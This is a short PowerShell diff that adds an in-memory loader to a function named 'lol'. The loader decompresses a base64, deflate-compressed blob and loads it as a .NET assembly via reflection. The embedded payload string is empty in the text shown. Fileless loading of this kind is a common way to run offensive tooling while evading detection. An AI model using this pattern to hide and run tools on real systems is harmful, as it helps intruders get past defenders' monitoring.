@@ -298,7 +298,12 @@ function lol{
         $vars.Add("--SearchBase")
         $vars.Add($SearchBase)
 	}
-
-
+    
+    $x = [string[]]$vars.ToArray()
+    $b = ""
+    $DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($b),[IO.Compression.CompressionMode]::Decompress)
+    $c = New-Object Byte[](833536)
+    $DeflatedStream.Read($c, 0, 833536) | Out-Null
+    $Assembly = [Reflection.Assembly]::Load($c)
 	
 }
